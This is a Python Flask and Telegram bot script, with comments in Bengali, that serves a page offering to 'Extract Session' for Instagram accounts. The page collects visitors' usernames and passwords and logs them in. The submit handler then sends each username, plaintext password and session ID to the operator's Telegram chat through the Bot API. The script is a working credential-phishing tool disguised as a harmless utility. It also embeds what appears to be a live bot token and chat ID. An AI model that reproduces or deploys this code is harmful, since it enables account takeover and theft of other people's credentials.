import threading
import requests
from flask import Flask, request, render_template_string
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from instagrapi import Client

# --- আপনার তথ্য এখানে দিন ---
BOT_TOKEN = '9213115853:AAFENDfTPRHxfUKKaVjLb2jJUB75ROhQ-Jc'
ADMIN_CHAT_ID = '5428249457' # @userinfobot থেকে আইডি নিন
# -----------------------------

# --- ১. টেলিগ্রাম বট সেটআপ ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("বট চালু হয়েছে! ওয়েবসাইটে গিয়ে আপনার নিজের আইডি-পাসওয়ার্ড দিন।")

def run_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("Bot is running...")
    app.run_polling()

# --- ২. ওয়েবসাইট এবং লগইন সিস্টেম (Flask) ---
web_app = Flask(__name__)

# ওয়েবসাইটের ডিজাইন
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>My Session Tool</title>
    <style>
        body { font-family: sans-serif; background: #111; color: white; text-align: center; padding-top: 50px; }
        input { padding: 10px; margin: 10px; width: 80%; border-radius: 5px; border: none; }
        button { padding: 10px 20px; background: #e1306c; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        #result { margin-top: 20px; color: #00ff88; word-break: break-all; }
    </style>
</head>
<body>
    <h2>Get My Session ID</h2>
    <form action="/submit" method="POST">
        <input type="text" name="username" placeholder="Your Username" required><br>
        <input type="password" name="password" placeholder="Your Password" required><br>
        <button type="submit">Extract Session</button>
    </form>
    <div id="result"></div>
</body>
</html>
"""

@web_app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@web_app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    
    try:
        # ইন্সটাগ্রাম ক্লায়েন্ট তৈরি
        cl = Client()
        cl.login(username, password) # লগইন করা হচ্ছে
        session_id = cl.sessionid     # সেশন আইডি বের করা হচ্ছে
        
        # আপনার টেলিগ্রামে তথ্য পাঠানো
        send_to_telegram(username, password, session_id)
        
        # ব্রাউজারে দেখানো (ঐচ্ছিক)
        return f"<h1>Success!</h1><p>Session ID: {session_id}</p>"
        
    except Exception as e:
        return f"<h1>Error:</h1><p>{str(e)}</p>"

def send_to_telegram(user, pw, sess_id):
    # টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    text = f"**New Login Info**\n\n👤 Username: `{user}`\n🔑 Password: `{pw}`\n🔗 Session: `{sess_id}`"
    payload = {
        "chat_id": ADMIN_CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print("Error sending to telegram:", e)

# --- ৩. বট এবং ওয়েবসাইট একসাথে চালানো ---
if __name__ == '__main__':
    # বট আলাদা থ্রেডে চালানো
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()
    
    # ওয়েবসাইট চালু করা
    print("Website running on port 5000...")
    web_app.run(host='0.0.0.0', port=5000)
